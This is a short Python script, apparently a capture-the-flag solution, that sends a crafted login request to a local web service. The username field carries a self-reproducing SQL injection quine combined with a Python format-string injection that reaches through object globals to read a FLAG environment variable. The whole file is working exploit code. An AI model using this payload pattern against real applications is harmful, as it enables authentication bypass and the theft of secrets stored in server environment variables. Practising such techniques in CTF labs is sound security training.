payload = {
	'username': r'''"\'UNION SELECT printf(char(34,92,39)||s,char(34),s,char(34)),1||1 FROM(SELECT"UNION SELECT printf(char(34,92,39)||s,char(34),s,char(34)),1||1 FROM(SELECT%c%s%cs)--{post.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}"s)--{post.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}''',
	'password': '11'
}

import requests

print(requests.post(
	'http://localhost:80/',
	data=payload
).text)
